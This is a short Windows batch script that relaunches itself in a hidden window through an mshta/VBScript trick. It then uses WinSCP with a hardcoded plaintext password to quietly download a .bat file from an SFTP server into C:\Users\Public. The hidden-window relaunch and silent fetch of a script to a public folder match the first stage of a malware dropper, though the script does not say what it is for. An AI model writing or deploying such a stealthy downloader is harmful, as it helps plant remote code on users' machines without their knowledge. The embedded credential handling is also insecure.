@echo off
setlocal

::make windows show time shorter
if "%1"=="hide" goto CmdBegin
start mshta vbscript:createobject("wscript.shell").run("""%~0"" hide",0)(window.close)&&exit
:CmdBegin

rem Set your WinSCP executable path (update this path if needed)
set WINSCP_PATH="C:\Program Files (x86)\WinSCP\WinSCP.com"

rem Set your SFTP server details
set SFTP_HOST=172.20.10.10
set SFTP_USER=mysftpuser
set SFTP_PASSWORD=12345
set REMOTE_FILE= /test/test.bat
set LOCAL_FILE=C:\Users\Public\test.bat

rem Download the executable file from the SFTP server
%WINSCP_PATH% /command ^
    "open sftp://%SFTP_USER%:%SFTP_PASSWORD%@%SFTP_HOST%" ^
    "get %REMOTE_FILE%  C:\Users\Public\test.bat" ^
    "exit"



endlocal
